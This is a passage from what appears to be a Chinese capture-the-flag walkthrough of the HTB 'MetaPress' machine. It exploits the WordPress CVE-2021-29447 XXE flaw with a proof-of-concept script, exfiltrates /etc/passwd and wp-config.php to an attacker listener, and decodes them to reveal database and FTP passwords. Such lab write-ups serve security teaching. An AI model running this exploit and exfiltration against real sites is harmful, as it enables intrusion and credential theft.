class="hljs-number">03</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58324</span> [<span class="hljs-number">404</span>]: <span class="hljs-symbol">GET</span> /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/<span class="hljs-number">8</span><span class="hljs-symbol">BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN</span>/<span class="hljs-symbol">DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc</span>+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/<span class="hljs-symbol">XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk</span>+<span class="hljs-symbol">OYjQ</span>+<span class="hljs-symbol">NqoFkul74jA</span>+<span class="hljs-symbol">QNWiudUSdJtGt44ivtk4</span>/<span class="hljs-symbol">Y</span>/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+<span class="hljs-symbol">DxSGoX8NPiqwNLVkI</span>+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+<span class="hljs-number">63</span>oDFseRRE/<span class="hljs-number">9</span><span class="hljs-symbol">Mfvj8FR2rHPdy3DzGehnMRP</span>+<span class="hljs-symbol">LltfLt2d</span>+<span class="hljs-number">0</span>aI9O9wE34hyve2RND7xT7Fw== - <span class="hljs-symbol">No</span> such file or directory<br>[<span class="hljs-symbol">Mon</span> <span class="hljs-symbol">Sep</span> <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">00</span>:<span class="hljs-number">03</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.186</span>:<span class="hljs-number">58324</span> <span class="hljs-symbol">Closing</span><br></code></pre></td></tr></table></figure>
+
+<p>18、然后使用本地的PHP文件解码下</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(kali㉿offsec)-[~<span class="hljs-regexp">/Desktop/</span><span class="hljs-variable constant_">CVE</span>-<span class="hljs-number">2021</span>-<span class="hljs-number">29447</span>-<span class="hljs-title class_">Po</span>C-main]<br>└─<span class="hljs-variable">$ </span>php decode.php <br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">jnelson:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:jnelson</span>,,,<span class="hljs-symbol">:/home/jnelson</span><span class="hljs-symbol">:/bin/bash</span><br>systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">999</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">coredump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">998</span><span class="hljs-symbol">:</span><span class="hljs-number">998</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Core</span> <span class="hljs-title class_">Dumper</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">111</span><span class="hljs-symbol">:MySQL</span> <span class="hljs-title class_">Server</span>,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">proftpd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/proftpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">ftp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/srv/ftp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br></code></pre></td></tr></table></figure>
+
+<p>19、可以看到是利用成功了，那接下来就读取下网站的配置文件</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gradle">┌──(kali㉿offsec)-[~<span class="hljs-regexp">/Desktop/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">29447</span>-PoC-main]<br>└─$ python3 PoC.py -l <span class="hljs-number">10.10</span>.<span class="hljs-number">14.22</span> -p <span class="hljs-number">8000</span> -f ../wp-config.php                                <br><br>    ╔═╗╦  ╦╔═╗     <br>    ║  ╚╗╔╝║╣────<span class="hljs-number">2021</span>-<span class="hljs-number">29447</span><br>    ╚═╝ ╚╝ ╚═╝<br>    Written By (Isa Ebrahim - <span class="hljs-number">0</span>xRar) on January, <span class="hljs-number">2023</span><br><br>    ═══════════════════════════════════════════════════════════════════════════<br>    [*] Title: Wordpress XML parsing issue in the Media Library leading to XXE<br>    [*] Affected versions: Wordpress <span class="hljs-number">5.6</span> - <span class="hljs-number">5.7</span><br>    [*] Patched version: Wordpress <span class="hljs-number">5.7</span>.<span class="hljs-number">1</span><br>    [*] Installation version: PHP <span class="hljs-number">8</span><br>    ═══════════════════════════════════════════════════════════════════════════<br>    <br>[+] payload.wav was created.<br>[+] evil.dtd was created.<br>[+] manually upload the payload.wav <span class="hljs-keyword">file</span> to the Media Library.<br>[+] wait <span class="hljs-keyword">for</span> the GET request.<br><br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">30</span> <span class="hljs-number">2024</span>] PHP <span class="hljs-number">8.2</span>.<span class="hljs-number">12</span> Development Server (http:<span class="hljs-comment">//0.0.0.0:8000) started</span><br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">37</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37540</span> Accepted<br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">37</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37540</span> [<span class="hljs-number">200</span>]: GET /evil.dtd<br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">37</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37540</span> Closing<br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">39</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37548</span> Accepted<br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">39</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37548</span> [<span class="hljs-number">404</span>]: GET <span class="hljs-regexp">/?p=jVVZU/</span>JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs<span class="hljs-regexp">/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/g</span>sc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ<span class="hljs-regexp">/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/</span>C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr<span class="hljs-regexp">/qEK/</span><span class="hljs-number">7</span>NN01dkWOcURa6<span class="hljs-regexp">/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/</span><span class="hljs-number">3</span>vYy<span class="hljs-regexp">/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/</span><span class="hljs-number">18</span>eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny<span class="hljs-regexp">/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/</span>v5GXhI<span class="hljs-regexp">/c2e+qtvlHUqXqO/</span>FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+<span class="hljs-number">7</span>fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4<span class="hljs-regexp">/dF6vPXk/</span><span class="hljs-number">6</span>UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3<span class="hljs-regexp">/oqlwaTju59E2wnC7j/</span><span class="hljs-number">1</span>iL<span class="hljs-regexp">/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/</span>q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF<span class="hljs-regexp">/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/U</span>KDO3PB2UtuA8NfW<span class="hljs-regexp">/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/</span>vgAe8AksuA82SzcIpuRI53zfTk<span class="hljs-regexp">/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/</span>Nw== - No such <span class="hljs-keyword">file</span> or directory                                                                                    <br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">39</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37548</span> Closing<br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">40</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37556</span> Accepted<br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">40</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37556</span> [<span class="hljs-number">200</span>]: GET /evil.dtd<br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">40</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37556</span> Closing<br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">40</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37558</span> Accepted<br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">40</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37558</span> [<span class="hljs-number">404</span>]: GET <span class="hljs-regexp">/?p=jVVZU/</span>JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs<span class="hljs-regexp">/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/g</span>sc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ<span class="hljs-regexp">/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/</span>C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr<span class="hljs-regexp">/qEK/</span><span class="hljs-number">7</span>NN01dkWOcURa6<span class="hljs-regexp">/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/</span><span class="hljs-number">3</span>vYy<span class="hljs-regexp">/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/</span><span class="hljs-number">18</span>eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny<span class="hljs-regexp">/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/</span>v5GXhI<span class="hljs-regexp">/c2e+qtvlHUqXqO/</span>FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+<span class="hljs-number">7</span>fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4<span class="hljs-regexp">/dF6vPXk/</span><span class="hljs-number">6</span>UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3<span class="hljs-regexp">/oqlwaTju59E2wnC7j/</span><span class="hljs-number">1</span>iL<span class="hljs-regexp">/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/</span>q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF<span class="hljs-regexp">/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/U</span>KDO3PB2UtuA8NfW<span class="hljs-regexp">/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/</span>vgAe8AksuA82SzcIpuRI53zfTk<span class="hljs-regexp">/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/</span>Nw== - No such <span class="hljs-keyword">file</span> or directory                                                                                    <br>[Mon Sep <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">03</span>:<span class="hljs-number">40</span> <span class="hljs-number">2024</span>] <span class="hljs-number">10.10</span>.<span class="hljs-number">11.186</span>:<span class="hljs-number">37558</span> Closing<br></code></pre></td></tr></table></figure>
+
+<p>20、继续解码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿offsec)-[~/Desktop/CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">29447</span>-PoC-main]<br>└─$ php decode.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/** The name of the database for WordPress */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;blog&#x27;</span> );<br><br><span class="hljs-comment">/** MySQL database username */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;blog&#x27;</span> );<br><br><span class="hljs-comment">/** MySQL database password */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;635Aq@TdqrCwXFUZ&#x27;</span> );<br><br><span class="hljs-comment">/** MySQL hostname */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span> );<br><br><span class="hljs-comment">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_CHARSET&#x27;</span>, <span class="hljs-string">&#x27;utf8mb4&#x27;</span> );<br><br><span class="hljs-comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> );<br><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;FS_METHOD&#x27;</span>, <span class="hljs-string">&#x27;ftpext&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;FTP_USER&#x27;</span>, <span class="hljs-string">&#x27;metapress.htb&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;FTP_PASS&#x27;</span>, <span class="hljs-string">&#x27;9NYS_ii@FyL_p5M2NvJ&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;FTP_HOST&#x27;</span>, <span class="hljs-string">&#x27;ftp.metapress.htb&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;FTP_BASE&#x27;</span>, <span class="hljs-string">&#x27;blog/&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;FTP_SSL&#x27;</span>, <span class="hljs-literal">false</span> );<br><br><span class="hljs-comment">/**#@+</span><br><span class="hljs-comment"> * Authentication Unique Keys and Salts.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> 2.6.0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;AUTH_KEY&#x27;</span>,         <span class="hljs-string">&#x27;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7&#125;`rXVG=3 n&gt;+3m?.B/:&#x27;</span> );<br><span class="hljs-title function_ invoke__">define</span>( <span class="hljs-string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span 